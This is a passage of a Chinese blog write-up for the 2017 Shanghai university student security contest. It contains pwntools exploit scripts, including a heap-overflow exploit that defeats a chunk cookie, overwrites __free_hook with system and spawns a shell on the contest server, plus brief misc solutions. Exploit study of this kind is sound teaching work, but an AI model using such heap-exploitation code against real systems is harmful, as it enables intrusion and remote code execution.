+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;terminator&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	cn = process(<span class="string">&#x27;./p200&#x27;</span>)</span><br><span class="line">	<span class="built_in">bin</span> = ELF(<span class="string">&#x27;./p200&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	cn = remote(<span class="string">&#x27;106.75.8.58&#x27;</span>, <span class="number">12333</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">	gdb.attach(cn,a)</span><br><span class="line">	<span class="keyword">if</span> a == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">		raw_input()</span><br><span class="line"></span><br><span class="line">cn.recvuntil(<span class="string">&#x27;choose&#x27;</span>)</span><br><span class="line">cn.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">cn.recvuntil(<span class="string">&#x27;choose&#x27;</span>)</span><br><span class="line">cn.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">cn.recvuntil(<span class="string">&#x27;length&#x27;</span>)</span><br><span class="line">cn.sendline(<span class="string">&#x27;48&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">cn.sendline(p64(<span class="number">0x0602D50</span>)*<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">cn.recvuntil(<span class="string">&#x27;choose&#x27;</span>)</span><br><span class="line">cn.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">cn.recvuntil(<span class="string">&#x27;length&#x27;</span>)</span><br><span class="line">cn.sendline(<span class="string">&#x27;48&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">cn.sendline(p64(<span class="number">0x0602D50</span>)*<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><p><img src="/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/shanghaidaxuesheng_6b12d578de7406a04ac3a39eeeee1459.png"></p>
+<p>一开始，出题人先在heap上挖了很多空，如果直接堆构造肯定会落在洞里。</p>
+<p>所以考虑在构造之前先malloc一堆，把洞填了就行了。</p>
+<p>在edit函数中有两个非常大方的堆溢出</p>
+<p><img src="/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/shanghaidaxuesheng_e170d1de220fed97d40173b2c3e6ae64.png"></p>
+<p>但是程序在每一个堆块的后面放了一个随机的rand_num做cookie，然后在edit和show的时候做检查。</p>
+<p>看似能防止堆溢出其实不然。</p>
+<p>因为它检查的逻辑是如果<strong>要操作</strong>的结构体的cookie有问题则退出。</p>
+<p>所以我们先创建两个结构体，然后第一个结构体帮第二个结构体做修改，然后操作第二个结构体。</p>
+<p><img src="/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/shanghaidaxuesheng_28bb7c4f98bbf5dff1ef609a169fba09.png"></p>
+<p>结构体上有一个指针，通过溢出修改指针到bss段存储cookie的前面，就可以修改cookie或是读取cookie。（我选择修改</p>
+<p>没了cookie，暴力堆溢出真的简单。</p>
+<p>基本就是用结构体上的任意指针为所欲为。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;terminator&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	cn = process(<span class="string">&#x27;./heap&#x27;</span>)</span><br><span class="line">	<span class="built_in">bin</span> = ELF(<span class="string">&#x27;./heap&#x27;</span>)</span><br><span class="line">	libc = ELF(<span class="string">&#x27;./libc_local.so&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	cn = remote(<span class="string">&#x27;106.75.8.58&#x27;</span>, <span class="number">23238</span>)</span><br><span class="line">	<span class="built_in">bin</span> = ELF(<span class="string">&#x27;./heap&#x27;</span>)</span><br><span class="line">	libc = ELF(<span class="string">&#x27;./remote_libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">	gdb.attach(cn,a)</span><br><span class="line">	<span class="keyword">if</span> a == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">		raw_input()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name,namelen,schname,schnamelen</span>):</span><br><span class="line">	cn.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">	cn.sendline(<span class="built_in">str</span>(namelen))</span><br><span class="line">	cn.recvuntil(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">	cn.sendline(name)</span><br><span class="line">	cn.recvuntil(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">	cn.sendline(<span class="built_in">str</span>(schnamelen))</span><br><span class="line">	cn.recvuntil(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">	cn.sendline(schname)</span><br><span class="line">	cn.recvuntil(<span class="string">&#x27;tutor&#x27;</span>)</span><br><span class="line">	cn.sendline(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">idx</span>):</span><br><span class="line">	cn.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">&#x27;delete&#x27;</span>)</span><br><span class="line">	cn.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chg_name</span>(<span class="params">idx,length,s</span>):</span><br><span class="line">	cn.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">&#x27;edit&#x27;</span>)</span><br><span class="line">	cn.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">	cn.recvuntil(<span class="string">&#x27;member&#x27;</span>)</span><br><span class="line">	cn.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">	cn.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">	cn.recvuntil(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">	cn.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chg_schname</span>(<span class="params">idx,length,s</span>):</span><br><span class="line">	cn.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">&#x27;edit&#x27;</span>)</span><br><span class="line">	cn.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">	cn.recvuntil(<span class="string">&#x27;member&#x27;</span>)</span><br><span class="line">	cn.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">	cn.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">	cn.recvuntil(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">	cn.sendline(s)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">intro</span>(<span class="params">idx</span>):</span><br><span class="line">	cn.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">	cn.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">	add(<span class="string">&#x27;&#x27;</span>,<span class="number">7</span>,<span class="string">&#x27;&#x27;</span>,<span class="number">47</span>)</span><br><span class="line"></span><br><span class="line">p_rand_num=<span class="number">0x60F040</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;aaa&#x27;</span>,<span class="number">7</span>,<span class="string">&#x27;aaa&#x27;</span>,<span class="number">7</span>)<span class="comment">#100</span></span><br><span class="line">add(<span class="string">&#x27;bbb&#x27;</span>,<span class="number">7</span>,<span class="string">&#x27;bbb&#x27;</span>,<span class="number">7</span>)<span class="comment">#101</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;A&#x27;</span>*<span class="number">7</span>+<span class="string">&#x27;\x00&#x27;</span>+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x65</span>)+p32(<span class="number">101</span>)+p32(<span class="number">0</span>)+p64(p_rand_num)+p32(<span class="number">0xffffffff</span>)</span><br><span class="line">chg_schname(<span class="number">100</span>,<span class="number">200</span>,pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">4</span></span><br><span class="line">chg_name(<span class="number">101</span>,<span class="number">200</span>,pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;ccc&#x27;</span>,<span class="number">7</span>,<span class="string">&#x27;ccc&#x27;</span>,<span class="number">7</span>)<span class="comment">#102</span></span><br><span class="line">add(<span class="string">&#x27;ddd&#x27;</span>,<span class="number">7</span>,<span class="string">&#x27;ddd&#x27;</span>,<span class="number">7</span>)<span class="comment">#103</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;A&#x27;</span>*<span class="number">7</span>+<span class="string">&#x27;\x00&#x27;</span>+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x65</span>)+p32(<span class="number">103</span>)+p32(<span class="number">0</span>)+p64(<span class="built_in">bin</span>.got[<span class="string">&#x27;malloc&#x27;</span>])+p32(p_rand_num-<span class="built_in">bin</span>.got[<span class="string">&#x27;malloc&#x27;</span>]-<span class="number">1</span>)</span><br><span class="line">chg_schname(<span class="number">102</span>,<span class="number">200</span>,pay)</span><br><span class="line"></span><br><span class="line">intro(<span class="number">103</span>)</span><br><span class="line">cn.recvuntil(<span class="string">&#x27;My name is &#x27;</span>)</span><br><span class="line">malloc = u64(cn.recv()[:<span class="number">6</span>]+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">success(<span class="string">&#x27;malloc: &#x27;</span>+<span class="built_in">hex</span>(malloc))</span><br><span class="line">freehook = malloc-libc.symbols[<span class="string">&#x27;malloc&#x27;</span>]+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = malloc-libc.symbols[<span class="string">&#x27;malloc&#x27;</span>]+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;freehook: &#x27;</span>+<span class="built_in">hex</span>(freehook))</span><br><span class="line">success(<span class="string">&#x27;system: &#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;A&#x27;</span>*<span class="number">7</span>+<span class="string">&#x27;\x00&#x27;</span>+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x65</span>)+p32(<span class="number">103</span>)+p32(<span class="number">0</span>)+p64(freehook)+p32(<span class="number">8</span>)</span><br><span class="line">chg_schname(<span class="number">102</span>,<span class="number">200</span>,pay)</span><br><span class="line"></span><br><span class="line">pay = p64(system)</span><br><span class="line">chg_name(<span class="number">103</span>,<span class="number">200</span>,pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;/bin/sh&#x27;</span>,<span class="number">10</span>,<span class="string">&#x27;/bin/sh&#x27;</span>,<span class="number">10</span>)</span><br><span class="line">remove(<span class="number">104</span>)</span><br><span class="line"><span class="comment">#z()</span></span><br><span class="line">cn.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">00000000 chunk_struc     struc ; (sizeof=0x38, mappedto_6)</span></span><br><span class="line"><span class="string">	00000000 idx             dd ?                    ; base 10</span></span><br><span class="line"><span class="string">	00000004 field_4         dd ?</span></span><br><span class="line"><span class="string">	00000008 name            dq ?                    ; offset</span></span><br><span class="line"><span class="string">	00000010 name_len        dd ?</span></span><br><span class="line"><span class="string">	00000014 field_14        dd ?</span></span><br><span class="line"><span class="string">	00000018 intro_func      dq ?</span></span><br><span class="line"><span class="string">	00000020 sch_name        dq ?                    ; offset</span></span><br><span class="line"><span class="string">	00000028 sch_name_len    dd ?</span></span><br><span class="line"><span class="string">	0000002C is_tutor        dd ?</span></span><br><span class="line"><span class="string">	00000030 randnum         dd ?</span></span><br><span class="line"><span class="string">	00000034 field_34        dd ?</span></span><br><span class="line"><span class="string">00000038 chunk_struc     ends</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="misc-登机牌"><a href="#misc-登机牌" class="headerlink" title="misc 登机牌"></a>misc 登机牌</h2><p>png后面有一个rar先抠出来。</p>
+<p>然后反色后扫描下面的pdf417条码。</p>
+<p>得到压缩包的密码。</p>
+<p>解压得到pdf，在末尾写着flag。</p>
+<h2 id="misc-clemency"><a href="#misc-clemency" class="headerlink" title="misc clemency"></a>misc clemency</h2><p>一开始逆了半天程序，后来脑洞一发，猜测flag.enc就是9bits编码的flag，没有加密。</p>
+<p>果然</p>
+<p><img src="/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/shanghaidaxuesheng_5026e2a9b35ccfa76cb02325996b344a.png"></p>
+<h2 id="misc300"><a href="#misc300" class="headerlink" title="misc300"></a>misc300</h2><p>流量包</p>
+<p>先是binwalk一发，能找到两个压缩包，一个伪加密，提示我们关注加密的数据包，一个是真加密，猜测里面就是flag了。</p>
+<p>找到有key.log</p>
+<p>wireshark导入SSL。</p>
+<p>可以看到加密的数据包了。</p>
+<p>dump下来一个music.zip</p>
+<p>频域隐写，得到压缩包密码。</p>
+<p>解压得flag。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/veritas501">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#re1"><span class="toc-number">1.</span> <span class="toc-text">re1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#re2"><span class="toc-number">2.</span> <span class="toc-text">re2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn1"><span class="toc-number">3.</span> <span class="toc-text">pwn1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn2"><span class="toc-number">4.</span> <span class="toc-text">pwn2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn3"><span class="toc-number">5.</span> <span class="toc-text">pwn3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-%E7%99%BB%E6%9C%BA%E7%89%8C"><span class="toc-number">6.</span> <span class="toc-text">misc 登机牌</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-clemency"><span class="toc-number">7.</span> <span class="toc-text">misc clemency</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc300"><span class="toc-number">8.</span> <span class="toc-text">misc300</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/&text=2017上海大学生网络安全大赛 部分writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/&title=2017上海大学生网络安全大赛 部分writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/&is_video=false&description=2017上海大学生网络安全大赛 部分writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2017上海大学生网络安全大赛 部分writeup&body=Check out this article: https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/&title=2017上海大学生网络安全大赛 部分writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/&title=2017上海大学生网络安全大赛 部分writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/&title=2017上海大学生网络安全大赛 部分writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/&title=2017上海大学生网络安全大赛 部分writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/&name=2017上海大学生网络安全大赛 部分writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/&t=2017上海大学生网络安全大赛 部分writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    veritas501
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/veritas501">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
